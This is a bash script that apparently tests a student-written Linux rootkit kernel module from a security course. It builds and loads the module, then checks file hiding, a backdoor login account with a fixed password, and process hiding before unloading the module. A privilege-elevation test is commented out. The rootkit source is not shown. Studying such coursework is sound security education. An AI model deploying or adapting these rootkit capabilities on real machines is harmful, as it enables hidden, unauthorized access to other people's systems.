#!/bin/bash
clear
echo "========== This script tests the rootkit written by bufferoverflowers =========="
echo "========== This script tests the rootkit written by bufferoverflowers =========="
echo "========== This script tests the rootkit written by bufferoverflowers =========="
echo "========== This script tests the rootkit written by bufferoverflowers =========="
echo "========== This script tests the rootkit written by bufferoverflowers =========="
echo " "
echo "========== Installing the rootkit  =========="
make clean
make
./install_module.sh
echo "================================================================================"

echo " "
echo "========== Test file and folder hiding  =========="
./autotest_show_files
echo "----- Make some files"
mkdir cse509--folder
touch cse509--folder/a
touch cse509--folder/b
touch cse509--folder/c
echo "----- Lets see what we created"
ls cse*
./autotest_hide_files
echo " "
echo "----- Hidden files. Can we see it now?"
ls cse*
echo ">>>>> PASS <<<<<"
echo "================================================================================"

#Script cannot show privilage elevation properly. Run ./test_elevate yourself to see.
#echo " "
#echo "========== Test privilage elevation  =========="
#apt-get -y install runuser
#runuser -l shivanshu -c './test_elevate'
#echo ">>>>> PASS <<<<<"
#echo "================================================================================"

echo " "
echo "========== Test backdoor  =========="
./autotest_backdooradd
echo "Type password 12345 and see if you can log in"
echo "Upon successful login, exit."
ssh muzer@localhost
./autotest_backdoorrem
echo ">>>>> PASS <<<<<"
echo "================================================================================"

echo " "
echo "========== Test process hiding  =========="
./test_hide_proc
echo ">>>>> PASS <<<<<"
echo "================================================================================"

echo " "
echo "========== Removing the rootkit and cleaning up  =========="
rmmod rootkit
make clean
